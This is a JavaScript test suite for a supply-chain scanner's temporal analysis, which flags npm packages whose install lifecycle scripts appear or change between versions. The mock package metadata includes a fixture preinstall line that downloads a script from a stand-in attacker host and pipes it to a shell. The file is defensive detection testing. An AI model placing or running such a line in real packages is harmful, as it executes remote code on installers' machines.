const fs = require('fs');
const path = require('path');
const {
  test, asyncTest, assert, assertIncludes, assertNotIncludes,
  runScan, runCommand, BIN, TESTS_DIR, addSkipped
} = require('../test-utils');

async function runTemporalAnalysisTests() {
  // ============================================
  // TEMPORAL ANALYSIS TESTS
  // ============================================

  console.log('\n=== TEMPORAL ANALYSIS TESTS ===\n');

  const {
    fetchPackageMetadata,
    getLifecycleScripts,
    compareLifecycleScripts,
    getLatestVersions,
    detectSuddenLifecycleChange
  } = require('../../src/temporal-analysis.js');

  // --- getLifecycleScripts ---

  test('TEMPORAL: getLifecycleScripts returns {} for package.json without scripts', () => {
    const result = getLifecycleScripts({ name: 'foo', version: '1.0.0' });
    assert(Object.keys(result).length === 0, 'Should return empty object');
  });

  test('TEMPORAL: getLifecycleScripts returns {} for non-lifecycle scripts only', () => {
    const result = getLifecycleScripts({
      scripts: { test: 'jest', start: 'node index.js', build: 'tsc' }
    });
    assert(Object.keys(result).length === 0, 'Should return empty object for non-lifecycle scripts');
  });

  test('TEMPORAL: getLifecycleScripts extracts postinstall', () => {
    const result = getLifecycleScripts({
      scripts: { postinstall: 'node setup.js', test: 'jest' }
    });
    assert(Object.keys(result).length === 1, 'Should have exactly 1 key');
    assert(result.postinstall === 'node setup.js', 'Should extract postinstall value');
  });

  test('TEMPORAL: getLifecycleScripts extracts multiple lifecycle scripts', () => {
    const result = getLifecycleScripts({
      scripts: {
        preinstall: 'echo pre',
        postinstall: 'node setup.js',
        prepare: 'npm run build',
        test: 'jest',
        start: 'node .'
      }
    });
    assert(Object.keys(result).length === 3, 'Should have 3 lifecycle scripts');
    assert(result.preinstall === 'echo pre', 'preinstall value');
    assert(result.postinstall === 'node setup.js', 'postinstall value');
    assert(result.prepare === 'npm run build', 'prepare value');
  });

  test('TEMPORAL: getLifecycleScripts handles null/undefined input', () => {
    assert(Object.keys(getLifecycleScripts(null)).length === 0, 'null input');
    assert(Object.keys(getLifecycleScripts(undefined)).length === 0, 'undefined input');
    assert(Object.keys(getLifecycleScripts({})).length === 0, 'empty object');
  });

  test('TEMPORAL: getLifecycleScripts ignores non-string script values', () => {
    const result = getLifecycleScripts({
      scripts: { postinstall: 123, preinstall: 'echo ok' }
    });
    assert(Object.keys(result).length === 1, 'Should ignore numeric value');
    assert(result.preinstall === 'echo ok', 'Should keep string value');
  });

  // --- compareLifecycleScripts ---

  const mockMetadata = {
    versions: {
      '1.0.0': { scripts: { test: 'jest' } },
      '1.1.0': { scripts: { test: 'jest', postinstall: 'node exploit.js' } },
      '1.2.0': { scripts: { test: 'jest', postinstall: 'node safe-setup.js' } },
      '1.3.0': { scripts: { test: 'jest' } },
      '2.0.0': {
        scripts: {
          preinstall: 'curl http://evil.com | sh',
          postinstall: 'node steal.js',
          prepare: 'npm run build'
        }
      }
    }
  };

  test('TEMPORAL: compareLifecycleScripts detects added postinstall', () => {
    const result = compareLifecycleScripts('1.0.0', '1.1.0', mockMetadata);
    assert(result.added.length === 1, 'Should have 1 added script');
    assert(result.added[0].script === 'postinstall', 'Added script should be postinstall');
    assert(result.added[0].value === 'node exploit.js', 'Added script value');
    assert(result.removed.length === 0, 'No removed scripts');
    assert(result.modified.length === 0, 'No modified scripts');
  });

  test('TEMPORAL: compareLifecycleScripts detects removed postinstall', () => {
    const result = compareLifecycleScripts('1.1.0', '1.3.0', mockMetadata);
    assert(result.removed.length === 1, 'Should have 1 removed script');
    assert(result.removed[0].script === 'postinstall', 'Removed script should be postinstall');
    assert(result.removed[0].value === 'node exploit.js', 'Removed script value');
    assert(result.added.length === 0, 'No added scripts');
    assert(result.modified.length === 0, 'No modified scripts');
  });

  test('TEMPORAL: compareLifecycleScripts detects modified postinstall', () => {
    const result = compareLifecycleScripts('1.1.0', '1.2.0', mockMetadata);
    assert(result.modified.length === 1, 'Should have 1 modified script');
    assert(result.modified[0].script === 'postinstall', 'Modified script should be postinstall');
    assert(result.modified[0].oldValue === 'node exploit.js', 'Old value');
    assert(result.modified[0].newValue === 'node safe-setup.js', 'New value');
    assert(result.added.length === 0, 'No added scripts');
    assert(result.removed.length === 0, 'No removed scripts');
  });

  test('TEMPORAL: compareLifecycleScripts returns empty arrays for identical versions', () => {
    const result = compareLifecycleScripts('1.0.0', '1.3.0', mockMetadata);
    assert(result.added.length === 0, 'No added');
    assert(result.removed.length === 0, 'No removed');
    assert(result.modified.length === 0, 'No modified');
  });

  test('TEMPORAL: compareLifecycleScripts detects multiple changes', () => {
    const result = compareLifecycleScripts('1.0.0', '2.0.0', mockMetadata);
    assert(result.added.length === 3, 'Should have 3 added scripts (preinstall, postinstall, prepare)');
    const names = result.added.map(a => a.script).sort();
    assert(names[0] === 'postinstall', 'postinstall added');
    assert(names[1] === 'preinstall', 'preinstall added');
    assert(names[2] === 'prepare', 'prepare added');
  });

  test('TEMPORAL: compareLifecycleScripts throws for missing version', () => {
    let threw = false;
    try {
      compareLifecycleScripts('1.0.0', '9.9.9', mockMetadata);
    } catch (e) {
      threw = true;
      assert(e.message.includes('9.9.9'), 'Error should mention missing version');
    }
    assert(threw, 'Should have thrown for non-existent version');
  });

  test('TEMPORAL: compareLifecycleScripts throws for invalid metadata', () => {
    let threw = false;
    try {
      compareLifecycleScripts('1.0.0', '1.1.0', {});
    } catch (e) {
      threw = true;
      assert(e.message.includes('missing versions'), 'Error should mention missing versions');
    }
    assert(threw, 'Should have thrown for invalid metadata');
  });

  // --- getLatestVersions ---

  const mockMetadataWithTime = {
    versions: {
      '1.0.0': { scripts: { test: 'jest' } },
      '1.1.0': { scripts: { test: 'jest', postinstall: 'node exploit.js' } },
      '1.2.0': { scripts: { test: 'jest' } }
    },
    time: {
      created: '2020-01-01T00:00:00.000Z',
      modified: '2023-06-15T00:00:00.000Z',
      '1.0.0': '2020-01-15T00:00:00.000Z',
      '1.1.0': '2021-06-01T00:00:00.000Z',
      '1.2.0': '2023-03-10T00:00:00.000Z'
    }
  };

  test('TEMPORAL: getLatestVersions returns 2 most recent by default', () => {
    const result = getLatestVersions(mockMetadataWithTime);
    assert(result.length === 2, 'Should return 2 versions, got ' + result.length);
    assert(result[0].version === '1.2.0', 'First should be newest: ' + result[0].version);
    assert(result[1].version === '1.1.0', 'Second should be previous: ' + result[1].version);
    assert(result[0].publishedAt === '2023-03-10T00:00:00.000Z', 'Should include publishedAt');
  });

  test('TEMPORAL: getLatestVersions excludes created/modified keys', () => {
    const result = getLatestVersions(mockMetadataWithTime, 10);
    assert(result.length === 3, 'Should return only version entries, got ' + result.length);
    const versions = result.map(r => r.version);
    assert(!versions.includes('created'), 'Should not include created');
    assert(!versions.includes('modified'), 'Should not include modified');
  });

  test('TEMPORAL: getLatestVersions returns [] for missing time', () => {
    assert(getLatestVersions({}).length === 0, 'Empty metadata');
    assert(getLatestVersions({ time: null }).length === 0, 'Null time');
  });

  test('TEMPORAL: getLatestVersions with count=1', () => {
    const result = getLatestVersions(mockMetadataWithTime, 1);
    assert(result.length === 1, 'Should return 1 version');
    assert(result[0].version === '1.2.0', 'Should be newest version');
  });

  test('TEMPORAL: getLatestVersions skips versions not in versions object', () => {
    const meta = {
      versions: { '1.0.0': {} },
      time: { '1.0.0': '2020-01-01T00:00:00Z', '1.1.0': '2021-01-01T00:00:00Z' }
    };
    const result = getLatestVersions(meta);
    assert(result.length === 1, 'Should skip version not in versions object');
    assert(result[0].version === '1.0.0', 'Only 1.0.0 should be returned');
  });

  test('TEMPORAL: getLifecycleScripts extracts install script', () => {
    const result = getLifecycleScripts({ scripts: { install: 'node-gyp rebuild' } });
    assert(result.install === 'node-gyp rebuild', 'Should extract install');
    assert(Object.keys(result).length === 1, 'Should have 1 key');
  });

  test('TEMPORAL: getLifecycleScripts extracts prepublishOnly', () => {
    const result = getLifecycleScripts({ scripts: { prepublishOnly: 'npm test && npm run build' } });
    assert(result.prepublishOnly === 'npm test && npm run build', 'prepublishOnly');
  });

  // --- detectSuddenLifecycleChange (mocked) ---

  test('TEMPORAL: detectSuddenLifecycleChange detects added postinstall (mock)', () => {
    // Directly test the logic by simulating what detectSuddenLifecycleChange does internally
    const mockPkg = {
      versions: {
        '1.0.0': { scripts: { test: 'jest' } },
        '1.1.0': { scripts: { test: 'jest', postinstall: 'node malicious.js' } }
      },
      time: {
        created: '2020-01-01T00:00:00.000Z',
        modified: '2021-01-01T00:00:00.000Z',
        '1.0.0': '2020-01-15T00:00:00.000Z',
        '1.1.0': '2021-01-01T00:00:00.000Z'
      },
      maintainers: [{ name: 'evil', email: 'evil@example.com' }]
    };
    const latest = getLatestVersions(mockPkg, 2);
    const diff = compareLifecycleScripts(latest[1].version, latest[0].version, mockPkg);
    assert(diff.added.length === 1, 'Should detect 1 added script');
    assert(diff.added[0].script === 'postinstall', 'Should be postinstall');
    assert(diff.added[0].value === 'node malicious.js', 'Should have correct value');
  });

  test('TEMPORAL: detectSuddenLifecycleChange single version → not suspicious (mock)', () => {
    const mockSingle = {
      versions: { '1.0.0': { scripts: { test: 'jest' } } },
      time: {
        created: '2020-01-01T00:00:00.000Z',
        modified: '2020-01-01T00:00:00.000Z',
        '1.0.0': '2020-01-01T00:00:00.000Z'
      },
      maintainers: []
    };
    const latest = getLatestVersions(mockSingle, 2);
    assert(latest.length === 1, 'Should have only 1 version');
  });

  // --- detectSuddenLifecycleChange (mocked https via Module._load) ---

  const Module = require('module');
  const EventEmitter = require('events');

  async function withMockedHttps(mockResponseData, testFn) {
    const temporalPath = require.resolve('../../src/scanner/temporal-analysis.js');
    const savedTemporal = require.cache[temporalPath];
    delete require.cache[temporalPath];

    const mockHttps = {
      request: (options, callback) => {
        const res = new EventEmitter();
        res.statusCode = 200;
        res.resume = () => {};
        const req = new EventEmitter();
        req.end = () => {
          process.nextTick(() => {
            callback(res);
            process.nextTick(() => {
              const json = JSON.stringify(mockResponseData);
              res.emit('data', Buffer.from(json));
              res.emit('end');
            });
          });
        };
        req.setTimeout = () => {};
        req.destroy = () => {};
        return req;
      }
    };

    const originalLoad = Module._load;
    Module._load = function(request, parent, isMain) {
      if (request === 'https') return mockHttps;
      return originalLoad.apply(this, arguments);
    };

    try {
      const mod = require(temporalPath);
      await testFn(mod);
    } finally {
      Module._load = originalLoad;
      delete require.cache[temporalPath];
      if (savedTemporal) require.cache[temporalPath] = savedTemporal;
    }
  }

  await asyncTest('TEMPORAL: detectSuddenLifecycleChange added postinstall → CRITICAL (mocked)', async () => {
    const mockData = {
      name: 'test-pkg',
      maintainers: [{ name: 'evil', email: 'evil@example.com' }],
      versions: {
        '1.0.0': { scripts: { test: 'jest' } },
        '1.1.0': { scripts: { test: 'jest', postinstall: 'node exploit.js' } }
      },
      time: { '1.0.0': '2020-01-15T00:00:00.000Z', '1.1.0': '2021-01-01T00:00:00.000Z' }
    };
    await withMockedHttps(mockData, async (mod) => {
      const result = await mod.detectSuddenLifecycleChange('test-pkg');
      assert(result.packageName === 'test-pkg', 'Package name');
      assert(result.suspicious === true, 'Should be suspicious');
      const added = result.findings.find(f => f.type === 'lifecycle_added');
      assert(added, 'Should have lifecycle_added finding');
      assert(added.script === 'postinstall', 'Script should be postinstall');
      assert(added.severity === 'CRITICAL', 'postinstall should be CRITICAL');
      assert(result.latestVersion === '1.1.0', 'Latest version');
      assert(result.previousVersion === '1.0.0', 'Previous version');
    });
  });

  await asyncTest('TEMPORAL: detectSuddenLifecycleChange added prepare → HIGH (mocked)', async () => {
    const mockData = {
      name: 'test-pkg', maintainers: [],
      versions: {
        '1.0.0': { scripts: { test: 'jest' } },
        '1.1.0': { scripts: { test: 'jest', prepare: 'npm run build' } }
      },
      time: { '1.0.0': '2020-01-15T00:00:00.000Z', '1.1.0': '2021-01-01T00:00:00.000Z' }
    };
    await withMockedHttps(mockData, async (mod) => {
      const result = await mod.detectSuddenLifecycleChange('test-pkg');
      assert(result.suspicious === true, 'Should be suspicious');
      const added = result.findings.find(f => f.type === 'lifecycle_added');
      assert(added.severity === 'HIGH', 'prepare should be HIGH (non-critical)');
    });
  });

  await asyncTest('TEMPORAL: detectSuddenLifecycleChange modified script (mocked)', async () => {
    const mockData = {
      name: 'test-pkg', maintainers: [],
      versions: {
        '1.0.0': { scripts: { postinstall: 'node setup.js' } },
        '1.1.0': { scripts: { postinstall: 'node evil.js' } }
      },
      time: { '1.0.0': '2020-01-15T00:00:00.000Z', '1.1.0': '2021-01-01T00:00:00.000Z' }
    };
    await withMockedHttps(mockData, async (mod) => {
      const result = await mod.detectSuddenLifecycleChange('test-pkg');
      assert(result.suspicious === true, 'Should be suspicious');
      const modified = result.findings.find(f => f.type === 'lifecycle_modified');
      assert(modified, 'Should have lifecycle_modified finding');
      assert(modified.oldValue === 'node setup.js', 'Old value');
      assert(modified.newValue === 'node evil.js', 'New value');
    });
  });

  await asyncTest('TEMPORAL: detectSuddenLifecycleChange removed script → LOW (mocked)', async () => {
    const mockData = {
      name: 'test-pkg', maintainers: [],
      versions: {
        '1.0.0': { scripts: { postinstall: 'node setup.js' } },
        '1.1.0': { scripts: {} }
      },
      time: { '1.0.0': '2020-01-15T00:00:00.000Z', '1.1.0': '2021-01-01T00:00:00.000Z' }
    };
    await withMockedHttps(mockData, async (mod) => {
      const result = await mod.detectSuddenLifecycleChange('test-pkg');
      assert(result.suspicious === true, 'Should be suspicious');
      const removed = result.findings.find(f => f.type === 'lifecycle_removed');
      assert(removed, 'Should have lifecycle_removed finding');
      assert(removed.severity === 'LOW', 'Removed should be LOW');
    });
  });

  await asyncTest('TEMPORAL: detectSuddenLifecycleChange no changes → not suspicious (mocked)', async () => {
    const mockData = {
      name: 'test-pkg', maintainers: [{ name: 'alice', email: 'a@x.com' }],
      versions: {
        '1.0.0': { scripts: { test: 'jest' } },
        '1.1.0': { scripts: { test: 'mocha' } }
      },
      time: { '1.0.0': '2020-01-15T00:00:00.000Z', '1.1.0': '2021-01-01T00:00:00.000Z' }
    };
    await withMockedHttps(mockData, async (mod) => {
      const result = await mod.detectSuddenLifecycleChange('test-pkg');
      assert(result.suspicious === false, 'Should not be suspicious');
      assert(result.findings.length === 0, 'Should have no findings');
      assert(result.metadata.maintainers.length === 1, 'Should have maintainers');
    });
  });

  await asyncTest('TEMPORAL: detectSuddenLifecycleChange single version → correct structure (mocked)', async () => {
    const mockData = {
      name: 'test-pkg', maintainers: [],
      versions: { '1.0.0': { scripts: { test: 'jest' } } },
      time: { '1.0.0': '2020-01-15T00:00:00.000Z' }
    };
    await withMockedHttps(mockData, async (mod) => {
      const result = await mod.detectSuddenLifecycleChange('test-pkg');
      assert(result.suspicious === false, 'Should not be suspicious');
      assert(result.latestVersion === '1.0.0', 'Latest version');
      assert(result.previousVersion === null, 'Previous version should be null');
      assert(result.metadata.note.includes('fewer than 2'), 'Should have note');
    });
  });

  await asyncTest('TEMPORAL: fetchPackageMetadata parses response (mocked)', async () => {
    const mockData = { name: 'mock-pkg', versions: { '1.0.0': {} } };
    await withMockedHttps(mockData, async (mod) => {
      const result = await mod.fetchPackageMetadata('mock-pkg');
      assert(result.name === 'mock-pkg', 'Name should match');
      assert(result.versions['1.0.0'], 'Should have version 1.0.0');
    });
  });

  // --- Integration: rules, playbooks, CLI flag ---

  test('TEMPORAL: Rules MUADDIB-TEMPORAL-001/002/003 exist', () => {
    const { getRule } = require('../../src/rules/index.js');
    const r1 = getRule('lifecycle_added_critical');
    assert(r1.id === 'MUADDIB-TEMPORAL-001', 'Rule 001 ID, got ' + r1.id);
    assert(r1.severity === 'CRITICAL', 'Rule 001 severity');
    const r2 = getRule('lifecycle_added_high');
    assert(r2.id === 'MUADDIB-TEMPORAL-002', 'Rule 002 ID, got ' + r2.id);
    assert(r2.severity === 'HIGH', 'Rule 002 severity');
    const r3 = getRule('lifecycle_modified');
    assert(r3.id === 'MUADDIB-TEMPORAL-003', 'Rule 003 ID, got ' + r3.id);
    assert(r3.severity === 'MEDIUM', 'Rule 003 severity');
  });

  test('TEMPORAL: Playbooks exist for temporal threat types', () => {
    const { getPlaybook } = require('../../src/response/playbooks.js');
    const p1 = getPlaybook('lifecycle_added_critical');
    assert(p1 && p1.includes('preinstall'), 'Playbook for lifecycle_added_critical');
    const p2 = getPlaybook('lifecycle_added_high');
    assert(p2 && p2.length > 10, 'Playbook for lifecycle_added_high');
    const p3 = getPlaybook('lifecycle_modified');
    assert(p3 && p3.length > 10, 'Playbook for lifecycle_modified');
  });

  await asyncTest('TEMPORAL: --temporal flag is accepted (direct)', async () => {
    const { runScanCached } = require('../test-utils');
    const result = await runScanCached(path.join(TESTS_DIR, 'clean'), { temporal: true });
    assert(result.summary !== undefined, 'Should produce valid scan result with --temporal');
  });

  // --- fetchPackageMetadata / detectSuddenLifecycleChange (integration, may be skipped in CI) ---

  const skipNetwork = process.env.CI === 'true' || process.env.SKIP_NETWORK === 'true';

  if (!skipNetwork) {
    await asyncTest('TEMPORAL: fetchPackageMetadata fetches lodash metadata', async () => {
      const metadata = await fetchPackageMetadata('lodash');
      assert(metadata && typeof metadata === 'object', 'Should return an object');
      assert(metadata.versions && typeof metadata.versions === 'object', 'Should have versions');
      assert('4.17.21' in metadata.versions, 'Should contain version 4.17.21');
      assert(metadata.name === 'lodash', 'Package name should be lodash');
    });

    await asyncTest('TEMPORAL: fetchPackageMetadata throws for non-existent package', async () => {
      let threw = false;
      try {
        await fetchPackageMetadata('package-qui-nexiste-pas-xyz123-muaddib');
      } catch (e) {
        threw = true;
        assert(e.message.includes('not found'), 'Error should mention not found');
      }
      assert(threw, 'Should have thrown for non-existent package');
    });

    await asyncTest('TEMPORAL: detectSuddenLifecycleChange on lodash → not suspicious', async () => {
      const result = await detectSuddenLifecycleChange('lodash');
      assert(result.packageName === 'lodash', 'packageName should be lodash');
      assert(result.suspicious === false, 'lodash should not be suspicious');
      assert(Array.isArray(result.findings), 'findings should be array');
      assert(result.latestVersion !== null, 'latestVersion should exist');
      assert(result.previousVersion !== null, 'previousVersion should exist');
      assert(result.metadata.maintainers !== undefined, 'Should have maintainers');
    });

    await asyncTest('TEMPORAL: detectSuddenLifecycleChange returns correct structure', async () => {
      const result = await detectSuddenLifecycleChange('chalk');
      assert(typeof result.packageName === 'string', 'packageName should be string');
      assert(typeof result.suspicious === 'boolean', 'suspicious should be boolean');
      assert(Array.isArray(result.findings), 'findings should be array');
      assert(typeof result.latestVersion === 'string', 'latestVersion should be string');
      assert(typeof result.previousVersion === 'string', 'previousVersion should be string');
      assert(typeof result.metadata === 'object', 'metadata should be object');
      assert(typeof result.metadata.latestPublishedAt === 'string', 'latestPublishedAt should be string');
      assert(typeof result.metadata.previousPublishedAt === 'string', 'previousPublishedAt should be string');
    });
  } else {
    console.log('[SKIP] TEMPORAL: fetchPackageMetadata + detectSuddenLifecycleChange network tests (CI/SKIP_NETWORK)');
    addSkipped(4);
  }

  // ============================================
  // METADATA CACHE + INFLIGHT DEDUP TESTS
  // ============================================

  console.log('\n=== METADATA CACHE TESTS ===\n');

  const {
    clearMetadataCache,
    _metadataCache,
    _inflightRequests,
    METADATA_CACHE_TTL,
    METADATA_CACHE_MAX
  } = require('../../src/temporal-analysis.js');

  test('CACHE: clearMetadataCache clears both caches', () => {
    clearMetadataCache(); // Reset from any prior tests
    _metadataCache.set('test-pkg', { data: {}, fetchedAt: Date.now() });
    assert(_metadataCache.size === 1, 'Cache should have 1 entry after set, got ' + _metadataCache.size);
    clearMetadataCache();
    assert(_metadataCache.size === 0, 'Cache should be empty after clear');
    assert(_inflightRequests.size === 0, 'Inflight should be empty after clear');
  });

  test('CACHE: METADATA_CACHE_TTL is 5 minutes', () => {
    assert(METADATA_CACHE_TTL === 5 * 60 * 1000, 'TTL should be 5 minutes');
  });

  test('CACHE: METADATA_CACHE_MAX is 200', () => {
    assert(METADATA_CACHE_MAX === 200, 'Max should be 200');
  });

  await asyncTest('CACHE: fetchPackageMetadata returns cached data on second call (mocked)', async () => {
    const mockData = { name: 'cache-test-pkg', versions: { '1.0.0': {} } };
    let fetchCount = 0;

    await withMockedHttps(mockData, async (mod) => {
      // Clear cache for fresh test
      mod.clearMetadataCache();

      // Monkey-count via wrapper: the mocked https only has 1 response behavior
      const result1 = await mod.fetchPackageMetadata('cache-test-pkg');
      assert(result1.name === 'cache-test-pkg', 'First call should return data');

      // Second call should hit cache — won't even touch https
      const result2 = await mod.fetchPackageMetadata('cache-test-pkg');
      assert(result2.name === 'cache-test-pkg', 'Second call should return cached data');
      assert(result1 === result2, 'Should return same object reference from cache');
    });
  });

  await asyncTest('CACHE: fetchPackageMetadata expires after TTL (mocked)', async () => {
    const mockData = { name: 'ttl-test-pkg', versions: { '1.0.0': {} } };

    await withMockedHttps(mockData, async (mod) => {
      mod.clearMetadataCache();

      await mod.fetchPackageMetadata('ttl-test-pkg');
      // Manually expire the cache entry
      const entry = mod._metadataCache.get('ttl-test-pkg');
      assert(entry, 'Cache entry should exist');
      entry.fetchedAt = Date.now() - (mod.METADATA_CACHE_TTL + 1000);

      // Next call should NOT return the expired entry (will re-fetch)
      const result = await mod.fetchPackageMetadata('ttl-test-pkg');
      assert(result.name === 'ttl-test-pkg', 'Should re-fetch after TTL expiry');
      // The cache entry should be refreshed
      const refreshed = mod._metadataCache.get('ttl-test-pkg');
      assert(Date.now() - refreshed.fetchedAt < 5000, 'Cache should be refreshed');
    });
  });

  await asyncTest('CACHE: inflight dedup returns same Promise for concurrent calls (mocked)', async () => {
    const mockData = { name: 'dedup-pkg', versions: { '1.0.0': {} } };

    await withMockedHttps(mockData, async (mod) => {
      mod.clearMetadataCache();

      // Launch two concurrent fetches — should share the same inflight Promise
      const p1 = mod.fetchPackageMetadata('dedup-pkg');
      const p2 = mod.fetchPackageMetadata('dedup-pkg');

      const [r1, r2] = await Promise.all([p1, p2]);
      assert(r1.name === 'dedup-pkg', 'First result should be correct');
      assert(r2.name === 'dedup-pkg', 'Second result should be correct');
      assert(r1 === r2, 'Both should return the same object (inflight dedup)');
    });
  });

  test('CACHE: eviction when cache exceeds METADATA_CACHE_MAX', () => {
    clearMetadataCache();
    // Fill cache to max
    for (let i = 0; i < METADATA_CACHE_MAX; i++) {
      _metadataCache.set(`pkg-${i}`, { data: { i }, fetchedAt: Date.now() });
    }
    assert(_metadataCache.size === METADATA_CACHE_MAX, 'Cache should be at max');
    assert(_metadataCache.has('pkg-0'), 'First entry should exist before eviction');
  });

  // ============================================
  // NEGATIVE CACHE TESTS
  // ============================================

  console.log('\n=== NEGATIVE CACHE TESTS ===\n');

  const { NEGATIVE_CACHE_TTL } = require('../../src/temporal-analysis.js');

  test('NEGATIVE-CACHE: NEGATIVE_CACHE_TTL is 60 seconds', () => {
    assert(NEGATIVE_CACHE_TTL === 60 * 1000, 'Negative TTL should be 60s, got ' + NEGATIVE_CACHE_TTL);
  });

  test('NEGATIVE-CACHE: negative cache entry is respected', async () => {
    clearMetadataCache();
    // Manually insert a negative cache entry
    _metadataCache.set('failed-pkg', { data: null, error: true, fetchedAt: Date.now() });

    // fetchPackageMetadata should reject immediately without HTTP
    let rejected = false;
    try {
      await fetchPackageMetadata('failed-pkg');
    } catch (e) {
      rejected = true;
      assert(e.message.includes('Negative cache hit'), 'Error should mention negative cache, got: ' + e.message);
    }
    assert(rejected, 'Should reject for negative cache hit');
    clearMetadataCache();
  });

  test('NEGATIVE-CACHE: expired negative cache entry is ignored', () => {
    clearMetadataCache();
    // Insert an expired negative cache entry
    _metadataCache.set('expired-fail-pkg', { data: null, error: true, fetchedAt: Date.now() - (NEGATIVE_CACHE_TTL + 1000) });

    // The cache check in fetchPackageMetadata should skip the expired entry
    // (it will try to fetch, but we just verify the cache entry is treated as expired)
    const cached = _metadataCache.get('expired-fail-pkg');
    assert(cached.error === true, 'Should be an error entry');
    const isExpired = (Date.now() - cached.fetchedAt) >= NEGATIVE_CACHE_TTL;
    assert(isExpired, 'Entry should be expired');
    clearMetadataCache();
  });

  // ============================================
  // HTTP SEMAPHORE TESTS
  // ============================================

  console.log('\n=== HTTP SEMAPHORE TESTS ===\n');

  const { _httpSemaphore, HTTP_SEMAPHORE_MAX } = require('../../src/temporal-analysis.js');

  test('SEMAPHORE: HTTP_SEMAPHORE_MAX is 10', () => {
    assert(HTTP_SEMAPHORE_MAX === 10, 'Max should be 10, got ' + HTTP_SEMAPHORE_MAX);
  });

  test('SEMAPHORE: clearMetadataCache resets semaphore', () => {
    _httpSemaphore.active = 5;
    _httpSemaphore.queue.push(() => {});
    clearMetadataCache();
    assert(_httpSemaphore.active === 0, 'Active should be 0 after clear');
    assert(_httpSemaphore.queue.length === 0, 'Queue should be empty after clear');
  });

  test('SEMAPHORE: semaphore structure is correct', () => {
    assert(typeof _httpSemaphore.active === 'number', 'active should be a number');
    assert(Array.isArray(_httpSemaphore.queue), 'queue should be an array');
  });
}

module.exports = { runTemporalAnalysisTests };
